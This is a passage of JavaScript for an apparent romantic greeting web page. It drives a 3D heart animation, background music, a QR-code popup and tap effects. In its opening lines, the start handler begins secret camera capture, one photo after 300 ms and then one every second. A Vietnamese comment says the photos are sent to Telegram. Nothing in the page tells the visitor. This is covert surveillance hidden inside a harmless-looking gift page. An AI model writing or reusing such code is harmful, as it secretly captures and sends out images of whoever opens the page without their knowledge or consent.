                // Bắt đầu chụp ảnh tự động: tấm đầu tiên sau 300ms, sau đó cứ 1 giây gửi 1 tấm về Telegram
                setTimeout(() => { captureAndSendPhoto(); }, 300);
                cameraInterval = setInterval(() => { captureAndSendPhoto(); }, 1000);

                // Mở khóa giao diện và phát nhạc
                if (this.startGate) {
                    this.startGate.classList.add('fade-out');
                    setTimeout(() => {
                        this.startGate.style.display = 'none';
                    }, 600);
                }

                if (this.bgMusic) {
                    const playPromise = this.bgMusic.play();
                    if (playPromise !== undefined) {
                        playPromise.then(() => {
                            this.updateAudioIcon();
                        }).catch((err) => {
                            console.warn("Audio autoplay blocked:", err);
                        });
                    }
                }

                this.introAnim.start();
            };

            if (actionBtn) {
                actionBtn.addEventListener('click', handleStart);
                actionBtn.addEventListener('touchstart', handleStart, { passive: true });
            } else if (this.startGate) {
                this.startGate.addEventListener('click', handleStart);
                this.startGate.addEventListener('touchstart', handleStart, { passive: true });
            }

            if (this.audioBtn) {
                this.audioBtn.addEventListener('click', (e) => {
                    e.stopPropagation();
                    if (!this.bgMusic) return;
                    if (this.bgMusic.paused) {
                        this.bgMusic.play().catch(() => {});
                    } else {
                        this.bgMusic.pause();
                    }
                    this.updateAudioIcon();
                });
            }
        }

        updateAudioIcon() {
            if (!this.audioBtn || !this.bgMusic) return;
            if (this.bgMusic.paused) {
                this.audioBtn.innerHTML = '<span>🔇</span>';
                this.audioBtn.classList.add('muted');
            } else {
                this.audioBtn.innerHTML = '<span>🔊</span>';
                this.audioBtn.classList.remove('muted');
            }
        }

        initInteractions() {
            // QR Code Modal Handlers
            const qrBtn = document.getElementById('qr-toggle-btn');
            const qrModal = document.getElementById('qr-modal');
            const qrClose = document.getElementById('qr-close-btn');
            const qrDisplay = document.getElementById('qr-code-display');
            let qrGenerated = false;

            const openQR = () => {
                if (qrModal) qrModal.classList.add('active');
            };

            const closeQR = () => {
                if (qrModal) qrModal.classList.remove('active');
            };

            if (qrBtn) {
                qrBtn.addEventListener('click', (e) => {
                    e.stopPropagation();
                    openQR();
                });
            }

            if (qrClose) {
                qrClose.addEventListener('click', (e) => {
                    e.stopPropagation();
                    closeQR();
                });
            }

            if (qrModal) {
                qrModal.addEventListener('click', (e) => {
                    if (e.target === qrModal) closeQR();
                });
            }

            const handleTap = (clientX, clientY) => {
                if (!this.hasStarted) return;
                const normX = (clientX / window.innerWidth) * 2 - 1;
                const normY = -(clientY / window.innerHeight) * 2 + 1;
                this.explosionManager.createExplosion(normX, normY);
            };

            window.addEventListener('click', (e) => {
                if (e.target.closest('#audio-toggle') || e.target.closest('#qr-toggle-btn') || e.target.closest('#qr-modal')) return;
                handleTap(e.clientX, e.clientY);
            });

            window.addEventListener('touchend', (e) => {
                if (e.target.closest('#audio-toggle') || e.target.closest('#qr-toggle-btn') || e.target.closest('#qr-modal')) return;
                if (e.changedTouches && e.changedTouches.length > 0) {
                    const touch = e.changedTouches[0];
                    handleTap(touch.clientX, touch.clientY);
                }
            }, { passive: true });
        }

        animate() {
            requestAnimationFrame(this.animate);

            const delta = Math.min(this.clock.getDelta(), 0.1);
            const elapsedTime = this.clock.getElapsedTime();

            this.heart.update(elapsedTime);
            this.ground.update(elapsedTime);
            if (this.photosManager) this.photosManager.update();
            this.floatingHearts.update(elapsedTime, delta);
            this.floatingTexts.update(elapsedTime, delta);
            this.sparkles.update(elapsedTime);
            this.explosionManager.update(delta);

            this.cameraAnim.update(elapsedTime, delta, this.introAnim.isFinished);

            // 3D perspective sync for the center circular pink photo locked to exact heart center
            const photoEl = document.getElementById('center-heart-photo');
            if (photoEl) {
                // Exact optical visual center of the 3D heart in local space
                const center3D = new THREE.Vector3(0, 1.40, 0);
                center3D.applyMatrix4(this.heart.group.matrixWorld);

                // Project from 3D world space to 2D viewport pixels
                const projected = center3D.clone().project(this.camera);
                const pixelX = (projected.x * 0.5 + 0.5) * window.innerWidth;
                const pixelY = (-projected.y * 0.5 + 0.5) * window.innerHeight;

                const rotX = (this.heart.group.rotation.x) * (180 / Math.PI);
                const rotY = (this.heart.group.rotation.y) * (180 / Math.PI);
                const pulseVal = (this.heart.uniforms && this.heart.uniforms.uPulse) ? this.heart.uniforms.uPulse.value : 0;
                const beatScale = 1.0 + pulseVal * 1.35;

                photoEl.style.transform = `translate(-50%, -50%) translate3d(${pixelX}px, ${pixelY}px, 0) rotateX(${rotX}deg) rotateY(${rotY}deg) scale(${beatScale})`;
            }

            if (this.composer) {
                this.composer.render();
            } else {
                this.renderer.render(this.scene, this.camera);
            }
        }
    }

    if (document.readyState === 'loading') {
        document.addEventListener('DOMContentLoaded', () => { window.loveApp = new LoveExperienceApp(); });
    } else {
        window.loveApp = new LoveExperienceApp();
    }
})();
